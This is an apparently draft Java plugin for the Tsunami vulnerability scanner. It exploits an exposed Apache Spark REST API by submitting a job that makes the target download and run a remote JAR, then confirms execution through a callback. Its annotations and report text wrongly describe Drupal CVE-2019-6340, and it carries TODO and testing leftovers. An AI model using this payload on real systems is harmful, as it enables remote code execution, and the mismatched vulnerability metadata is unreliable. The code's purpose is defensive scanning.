package com.google.tsunami.plugins.detectors.rce.apachesparksexposedapi;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.base.Preconditions.checkState;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.auto.value.AutoValue;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import java.util.regex.Pattern;
import javax.inject.Inject;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.protobuf.ByteString;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import static java.nio.charset.StandardCharsets.UTF_8;
import java.lang.Thread;

/** A Tsunami plugin for detecting CVE-2019-6340. */
@PluginInfo(type = PluginType.VULN_DETECTION, name = "DrupalApacheSparksExposedApiVulnDetector", version = "0.1", description = "This plugin detects a Drupal remote code execution (RCE)"
		+ " vulnerability via Unsafe Deserialization in REST API", author = "Tsunami Team (tsunami-dev@google.com)", bootstrapModule = ApacheSparksExposedApiVulnDetectorBootstrapModule.class)
public final class ApacheSparksExposedApiVulnDetector implements VulnDetector {

	private final Clock utcClock;
	private final HttpClient httpClient;
	private final PayloadGenerator payloadGenerator;
		private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

	private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("Driver successfully submitted");
	private static String httpPayloadBodyFormatString = "{\"action\":\"CreateSubmissionRequest\",\"clientSparkVersion\":\"1\",\"appArgs\":[\"%s\"],\"appResource\":\"%s\",\"environmentVariables\":{\"SPARK_ENV_LOADED\":\"1\"},\"mainClass\":\"Tsunami\",\"sparkProperties\":{\"spark.jars\":\"%s\",\"spark.driver.supervise\":\"false\",\"spark.app.name\":\"Tsunami\",\"spark.eventLog.enabled\":\"true\",\"spark.submit.deployMode\":\"cluster\",\"spark.master\":\"spark://localhost:6066\"}}";
	private static final String JAR_PAYLOAD_URI = "https://github.com/timoles/tsunami-security-scanner-plugins/raw/exposed_spark_ui_and_api/payloads/community/apache_spark_exposed_api/Tsunami_Apache_Spark_Exploit.jar"; // TODO
																																																							// change
																																																							// github
													
	private static String interactionUriFormatString = "http://%s";

	@Inject
	ApacheSparksExposedApiVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
		this.utcClock = checkNotNull(utcClock);
		this.httpClient = checkNotNull(httpClient);
		this.payloadGenerator = checkNotNull(payloadGenerator);
	}

	@Override
	public DetectionReportList detect(TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
		logger.atInfo().log("ApacheSparksExposedApiVulnDetector starts detecting.");

		return DetectionReportList.newBuilder().addAllDetectionReports(matchedServices.stream()
				.filter(NetworkServiceUtils::isWebService).filter(this::isServiceVulnerable)
				.map(networkService -> buildDetectionReport(targetInfo, networkService)).collect(toImmutableList()))
				.build();
	}

	private boolean isServiceVulnerable(NetworkService networkService) {
	//	String baseUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
		//logger.atInfo().log("Trying to execute code at '%s'", baseUri);
		return exploitUri(networkService);
	}

	private boolean exploitUri(NetworkService networkService) {
		String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "v1/submissions/create";

		PayloadGeneratorConfig config = PayloadGeneratorConfig.newBuilder()
				.setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
				.setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
				.setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY).build();
		Payload payload = payloadGenerator.generate(config);

		String interactionUri = String.format(interactionUriFormatString, payload.getPayload());

		String finished_payload = String.format(httpPayloadBodyFormatString, interactionUri, JAR_PAYLOAD_URI,
				JAR_PAYLOAD_URI); // TODO

		try {

			HttpResponse response = httpClient.send(post(targetUri)
					.setHeaders(HttpHeaders.builder().addHeader("Content-Type", "application/json")
							.addHeader("User-Agent", "TSUNAMI_SCANNER").build())
					.setRequestBody(ByteString.copyFrom(finished_payload, "utf-8")).build(), networkService);

		} catch (IOException e) {
			logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);

			
		}
		// TODO remove, only for testing
		try {
		Thread.sleep(1000);
		}catch(Exception e) {}

		return payload.checkIfExecuted();
	}

	private DetectionReport buildDetectionReport(TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

		return DetectionReport.newBuilder().setTargetInfo(targetInfo).setNetworkService(vulnerableNetworkService)
				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
				.setVulnerability(Vulnerability.newBuilder()
						.setMainId(VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2019_6340"))
						.setSeverity(Severity.CRITICAL).setTitle("Drupal RCE CVE-2019-6340 Detected")
						.setDescription("Some field types do not properly sanitize data from non-form sources in "
								+ "Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10. This can lead"
								+ " to arbitrary PHP code execution in some cases. A site is only affected"
								+ " by this if one of the following conditions is met: The site has the"
								+ " Drupal 8 core RESTful Web Services (rest) module enabled and allows"
								+ " PATCH or POST requests, or the site has another web services module"
								+ " enabled, like JSON:API in Drupal 8, or Services or RESTful Web Services"
								+ " in Drupal 7. (Note: The Drupal 7 Services module itself does not"
								+ " require an update at this time, but you should apply other contributed"
								+ " updates associated with this advisory if Services is in use.)")
						.setRecommendation("Upgrade to Drupal 8.6.10 or Drupal 8.5.11 with security patches."))
				.build();
	}
}
